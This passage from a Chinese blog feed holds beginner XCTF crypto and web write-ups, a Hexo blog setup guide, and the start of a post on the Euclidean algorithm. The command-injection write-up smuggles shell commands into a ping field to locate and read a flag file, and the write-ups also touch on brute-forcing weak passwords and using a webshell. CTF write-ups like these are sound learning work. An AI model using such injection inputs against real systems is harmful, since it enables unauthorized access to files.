class="line">    lst.append(s[:<span class="number">5</span>])</span><br><span class="line">    s=s[<span class="number">5</span>:]</span><br><span class="line">print(lst)</span><br><span class="line"><span class="comment">#生成字典</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">b=string.ascii_lowercase</span><br><span class="line">l1=[]</span><br><span class="line">l2=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    l1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    l2.append(i)</span><br><span class="line">dic=dict(zip(l2,l1))</span><br><span class="line">print(dic)</span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    num=int(i,<span class="number">2</span>)</span><br><span class="line">    print(dic.get(num),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-幂数加密"><a href="#6-幂数加密" class="headerlink" title="6. 幂数加密"></a>6. 幂数加密</h2>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#字母数字对应表生成</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">l1=[]</span><br><span class="line">l2=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">    l1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_uppercase:</span><br><span class="line">    l2.append(i)</span><br><span class="line">dic=dict(zip(l1,l2))</span><br><span class="line">print(dic)</span><br><span class="line"><span class="comment">#字符串处理</span></span><br><span class="line">a=<span class="string">"8842101220480224404014224202480122"</span></span><br><span class="line">lst=a.split(<span class="string">"0"</span>)</span><br><span class="line">lst=[eval(x) <span class="keyword">for</span> x <span class="keyword">in</span> lst]</span><br><span class="line">lst1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    sum=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(i):</span><br><span class="line">        sum+=i%<span class="number">10</span></span><br><span class="line">        i=i//<span class="number">10</span></span><br><span class="line">    lst1.append(sum)</span><br><span class="line">print(lst1)</span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst1:</span><br><span class="line">    flag+=dic[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="6-easychallenge"><a href="#6-easychallenge" class="headerlink" title="6. easychallenge"></a>6. easychallenge</h2><p>给的是一个pyc文件,我就在在线python反编译网站上反编译了一下</p><p>得到python原码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode1</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) ^ <span class="number">36</span></span><br><span class="line">        x = x + <span class="number">25</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode2</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) + <span class="number">36</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode3</span><span class="params">(ans)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32encode(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">' '</span></span><br><span class="line">print(<span class="string">'Please Input your flag:'</span>)</span><br><span class="line">flag = input()</span><br><span class="line">final = <span class="string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span></span><br><span class="line"><span class="keyword">if</span> encode3(encode2(encode1(flag))) == final:</span><br><span class="line">    print(<span class="string">'correct'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'wrong'</span>)</span><br></pre></td></tr></table></figure><p>emmm,然后就好办了,加密方法都在上面了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">"UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==="</span></span><br><span class="line">s1=base64.b32decode(s)</span><br><span class="line">print(s1)</span><br><span class="line"></span><br><span class="line">s2=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1:</span><br><span class="line">    x=i^<span class="number">36</span></span><br><span class="line">    x-=<span class="number">36</span></span><br><span class="line">    s2+=chr(x)</span><br><span class="line">print(s2)</span><br><span class="line"></span><br><span class="line">s3=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s2:</span><br><span class="line">    x=ord(i)<span class="number">-25</span></span><br><span class="line">    x=x^<span class="number">36</span></span><br><span class="line">    s3+=chr(x)</span><br><span class="line">print(s3)</span><br></pre></td></tr></table></figure><h2 id="7-Normal-RSA"><a href="#7-Normal-RSA" class="headerlink" title="7. Normal_RSA"></a>7. Normal_RSA</h2><p>打开附件,里面是<code>pubkey.pem</code>和<code>flag.enc</code></p><p>我们可以利用kali里的openssl来搞</p><ol><li><p>把文件拖虚拟机里</p></li><li><p>终端输入openssl</p></li><li><p><code>openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</code></p><ul><li>exponent:E</li><li>modulus:N</li></ul><p>以上两个要用复制好</p></li><li><p>上网找在线分解质因数的搞出P,Q</p></li><li><p>然后在kali中使用(代码如下,pqe自填),会生成一个private.pem</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">arsa=RSA.generate(<span class="number">1024</span>)</span><br><span class="line">arsa.p=</span><br><span class="line">arsa.q=</span><br><span class="line">arsa.e=</span><br><span class="line">arsa.n=arsa.p*arsa.q</span><br><span class="line">Fn=long((arsa.p<span class="number">-1</span>)*(arsa.q<span class="number">-1</span>))</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    x=(Fn*i)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(x%arsa.e==<span class="number">0</span>):</span><br><span class="line">           arsa.d=x/arsa.e</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">private=open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(arsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure></li><li><p>在终端中打开openssl,输入<code>rsautl -decrypt -in flag.enc -inkey private.pem</code></p></li><li><p>ojbk</p></li></ol><h2 id="8-转轮机加密"><a href="#8-转轮机加密" class="headerlink" title="8. 转轮机加密"></a>8. 转轮机加密</h2><p>题目:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:  &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line"><span class="number">2</span>:  &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line"><span class="number">3</span>:  &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line"><span class="number">4</span>:  &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line"><span class="number">5</span>:  &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line"><span class="number">6</span>:  &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line"><span class="number">7</span>:  &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line"><span class="number">8</span>:  &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line"><span class="number">9</span>:  &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line"><span class="number">10</span>: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line"><span class="number">11</span>： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span><br><span class="line"><span class="number">12</span>： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span><br><span class="line"><span class="number">13</span>： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span><br><span class="line"></span><br><span class="line">密钥为：<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">6</span></span><br><span class="line">密文为：NFQKSEVOQOFNP</span><br></pre></td></tr></table></figure><p>大概就像旧式电话一样</p><p>对应着电话号码(2,3,7,5,13,12,9,1,8,10,4,11,6)</p><p>把对应轮数中的对应字符(N F Q K S E V O Q O F N P)</p><p>拨到第一个去(看下图第一列,与密文相同)</p><p><img src="image-20200404230355691.png" alt="image-20200404230355691"></p><p>然后竖着看,直到找到有实际意义的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circle</span><span class="params">(string,char)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> string[<span class="number">0</span>]!=char:</span><br><span class="line">        string=string[<span class="number">1</span>:]+string[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">s=<span class="string">"""ZWAXJGDLUBVIQHKYPNTCRMOSFE </span></span><br><span class="line"><span class="string">KPBELNACZDTRXMJQOYHGVSFUWI </span></span><br><span class="line"><span class="string">BDMAIZVRNSJUWFHTEQGYXPLOCK </span></span><br><span class="line"><span class="string">RPLNDVHGFCUKTEBSXQYIZMJWAO </span></span><br><span class="line"><span class="string">IHFRLABEUOTSGJVDKCPMNZQWXY </span></span><br><span class="line"><span class="string">AMKGHIWPNYCJBFZDRUSLOQXVET </span></span><br><span class="line"><span class="string">GWTHSPYBXIZULVKMRAFDCEONJQ </span></span><br><span class="line"><span class="string">NOZUTWDCVRJLXKISEFAPMYGHBQ </span></span><br><span class="line"><span class="string">XPLTDSRFHENYVUBMCQWAOIKZGJ </span></span><br><span class="line"><span class="string">UDNAJFBOWTGVRSCZQKELMXYIHP </span></span><br><span class="line"><span class="string">MNBVCXZQWERTPOIUYALSKDJFHG </span></span><br><span class="line"><span class="string">LVNCMXZPQOWEIURYTASBKJDFHG </span></span><br><span class="line"><span class="string">JZQAWSXCDERFVBGTYHNUMKILOP"""</span></span><br><span class="line">s=s.replace(<span class="string">" \n"</span>,<span class="string">" "</span>)</span><br><span class="line">lst=s.split(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">key=<span class="string">"2,3,7,5,13,12,9,1,8,10,4,11,6"</span></span><br><span class="line">key=key.split(<span class="string">","</span>)</span><br><span class="line">key=[int(i)<span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">x=<span class="string">"NFQKSEVOQOFNP"</span></span><br><span class="line">end=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    tempstr=lst[key[i]]</span><br><span class="line">    word=x[i]</span><br><span class="line">    end.append(circle(tempstr,word))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">        print(end[j][i].lower(),end=<span class="string">""</span>)</span><br><span class="line">    print(<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">nfqksevoqofnp</span><br><span class="line">ahgcxiusnwcbn</span><br><span class="line">ctwpcubfotuvy</span><br><span class="line">zetmdrmezgkcc</span><br><span class="line">dqhneyczuvtxj</span><br><span class="line">tgszrtqwtrezb</span><br><span class="line">rypqfawawsbqf</span><br><span class="line">xxywvsaxdcswz</span><br><span class="line">mpbxbbojczxed</span><br><span class="line"><span class="keyword">jlxygkigvqqrr</span></span><br><span class="line"><span class="keyword">qoiitjkdrkytu</span></span><br><span class="line"><span class="keyword">oczhydzljeips</span></span><br><span class="line"><span class="keyword">ykufhfgullzol</span></span><br><span class="line"><span class="keyword">hblrnhjbxmmio</span></span><br><span class="line"><span class="keyword">gdvlugxvkxjuq</span></span><br><span class="line"><span class="keyword">vmkamlpiiywyx</span></span><br><span class="line"><span class="keyword">sambkvlqsiaav</span></span><br><span class="line"><span class="keyword">fireinthehole</span></span><br><span class="line"><span class="keyword">uzaulcdkfprst</span></span><br><span class="line"><span class="keyword">wvfoomsyaupka</span></span><br><span class="line"><span class="keyword">irdtpxrppdldm</span></span><br><span class="line"><span class="keyword">kncsjzfnmnnjk</span></span><br><span class="line"><span class="keyword">psegzphtyadfg</span></span><br><span class="line"><span class="keyword">bjojqqecgjvhh</span></span><br><span class="line"><span class="keyword">eunvaonrhfhgi</span></span><br><span class="line"><span class="keyword">lwjdwwymbbgmw</span></span><br></pre></td></tr></table></figure><p>发现就<strong>fireinthehole</strong>是个可读的字符串</p><h2 id="9-easy-ECC"><a href="#9-easy-ECC" class="headerlink" title="9. easy_ECC"></a>9. easy_ECC</h2><p>是的,我不会</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xctf-crypto-新手练习区&quot;&gt;&lt;a href=&quot;#xctf-crypto-新手练习区&quot; class=&quot;headerlink&quot; title=&quot;xctf-crypto-新手练习区&quot;&gt;&lt;/a&gt;xctf-crypto-新手练习区&lt;/h1&gt;&lt;h2 id=&quot;1-bas
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://mercer5.github.io/categories/ctf/"/>
    
    
      <category term="安全" scheme="https://mercer5.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="ctf" scheme="https://mercer5.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>xctf-web-新手练习区</title>
    <link href="https://mercer5.github.io/2020/08/25/xctf-web-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>https://mercer5.github.io/2020/08/25/xctf-web-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2020-08-25T00:37:15.000Z</published>
    <updated>2020-08-25T00:39:44.647Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xctf-web-新手练习区"><a href="#xctf-web-新手练习区" class="headerlink" title="xctf-web-新手练习区"></a>xctf-web-新手练习区</h1><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p><img src="image-20200716153232985.png" alt="image-20200716153232985"></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p><img src="image-20200716153348036.png" alt="image-20200716153348036"></p><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><blockquote><p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p></blockquote><p><img src="image-20200716153539061.png" alt="image-20200716153539061"></p><p><img src="image-20200716153602077.png" alt="image-20200716153602077"></p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><blockquote><p>php的备份有两种：.php~和.php.bak</p></blockquote><p><img src="image-20200716154007563.png" alt="image-20200716154007563"></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p><img src="image-20200716154154950.png" alt="image-20200716154154950"></p><p><img src="image-20200716154219258.png" alt="image-20200716154219258"></p><p><img src="image-20200716154236015.png" alt="image-20200716154236015"></p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p><img src="image-20200716154347970.png" alt="image-20200716154347970"></p><p>删了下划内容</p><p><img src="image-20200716154418626.png" alt="image-20200716154418626"></p><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>爆破</p><p>123456</p><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><blockquote><p>| 的作用为将前一个命令的结果传递给后一个命令作为输入</p><p>&amp;&amp;的作用是前一条命令执行成功时，才执行后一条命令</p><p><img src="image-20200716155604029.png" alt="image-20200716155604029"></p></blockquote><ol><li><p>输入<code>127.0.0.1 |  find / -name &quot;flag.txt&quot;</code></p><p><img src="image-20200716155446460.png" alt="image-20200716155446460"></p></li><li><p>输入<code>127.0.0.1 |  cat /home/flag.txt</code></p><p><img src="image-20200716155526247.png" alt="image-20200716155526247"></p></li></ol><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p><img src="image-20200716155940510.png" alt="image-20200716155940510"></p><ol><li><p><code>a==0 &amp;&amp; a 存在</code>: <strong>php弱类型</strong></p></li><li><p><code>is_numeric</code>:检测变量是否为数字或数字字符串 </p><p>所以b不是数字或数字字符串但&gt;1234</p><p><strong>php弱类型比较</strong></p><p>可用<code>9999</code>+<code>任意字符</code></p></li></ol><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><blockquote><p>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项</p><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的</p></blockquote><p><img src="image-20200716161916503.png" alt="image-20200716161916503"></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>蚁剑/菜刀</p><p><img src="image-20200716162150632.png" alt="image-20200716162150632"></p><p><img src="image-20200716162232973.png" alt="image-20200716162232973"></p><p><img src="image-20200716162240177.png" alt="image-20200716162240177"></p><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p>1.打开页面，查看源代码，可以发现js代码，如图所示。</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/simple_js/1.png" alt="img"></p><p>2.进行代码审计，发现不论输入什么都会跳到假密码，真密码位于 fromCharCode 。</p><p>3.先将字符串用python处理一下，得到数组[55,56,54,79,115,69,114,116,107,49,50]，exp如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br><span class="line"><span class="keyword">print</span> (s)</span><br></pre></td></tr></table></figure><p>4.将得到的数字分别进行ascii处理，可得到字符串786OsErtk12，exp如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]</span><br><span class="line">c = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b = chr(i)</span><br><span class="line">    c = c + b</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><p>5.规范flag格式，可得到Cyberpeace{786OsErtk12}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xctf-web-新手练习区&quot;&gt;&lt;a href=&quot;#xctf-web-新手练习区&quot; class=&quot;headerlink&quot; title=&quot;xctf-web-新手练习区&quot;&gt;&lt;/a&gt;xctf-web-新手练习区&lt;/h1&gt;&lt;h2 id=&quot;view-source&quot;&gt;&lt;a h
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://mercer5.github.io/categories/ctf/"/>
    
    
      <category term="安全" scheme="https://mercer5.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="ctf" scheme="https://mercer5.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>换台电脑搞blog</title>
    <link href="https://mercer5.github.io/2020/08/25/%E6%8D%A2%E5%8F%B0%E7%94%B5%E8%84%91%E6%90%9Eblog/"/>
    <id>https://mercer5.github.io/2020/08/25/%E6%8D%A2%E5%8F%B0%E7%94%B5%E8%84%91%E6%90%9Eblog/</id>
    <published>2020-08-25T00:31:35.000Z</published>
    <updated>2020-08-25T00:34:47.866Z</updated>
    
    <content type="html"><![CDATA[<h1 id="换台电脑搞blog"><a href="#换台电脑搞blog" class="headerlink" title="换台电脑搞blog"></a>换台电脑搞blog</h1><blockquote><p>很好,之前的预言中了,电脑重装后,啥都没了</p><p>从现在开始重新搭建blog所需的环境之类的东西</p><p>顺便记录一下,恢复过程</p><p>2020-8-24</p></blockquote><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ol><li>git</li><li>nodejs</li></ol><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><ul><li>设置git全局邮箱和用户名</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"yourgithubname"</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"yourgithubemail"</span></span><br></pre></td></tr></table></figure><ul><li>设置ssh key</li></ul><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"youremail"</span></span><br><span class="line"><span class="meta">#生成后填到github</span></span><br></pre></td></tr></table></figure><ul><li>安装hexo</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install hexo-<span class="keyword">cli</span> -g</span><br></pre></td></tr></table></figure><p>但是已经不需要初始化了，</p><p>直接在任意文件夹下，</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">git</span>@………………</span><br></pre></td></tr></table></figure><p>然后进入克隆到的文件夹：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cd</span> <span class="selector-tag">xxx</span><span class="selector-class">.github</span><span class="selector-class">.io</span></span><br><span class="line"><span class="selector-tag">npm</span> <span class="selector-tag">install</span> <span class="selector-tag">hexo-deployer-git</span> <span class="selector-tag">--save</span></span><br></pre></td></tr></table></figure><p>生成，部署：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hexo</span> <span class="string">g</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><p>然后就可以开始写你的新博客了</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> newpage</span><br></pre></td></tr></table></figure><p>不要忘了，每次写完最好都把源文件上传一下</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">add</span> .</span><br><span class="line">git commit –m <span class="string">"xxxx"</span></span><br><span class="line">git <span class="keyword">push</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;换台电脑搞blog&quot;&gt;&lt;a href=&quot;#换台电脑搞blog&quot; class=&quot;headerlink&quot; title=&quot;换台电脑搞blog&quot;&gt;&lt;/a&gt;换台电脑搞blog&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;很好,之前的预言中了,电脑重装后,啥都没了&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>欧几里德算法及扩展算法</title>
    <link href="https://mercer5.github.io/2020/08/24/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%B7%E7%AE%97%E6%B3%95%E5%8F%8A%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/"/>
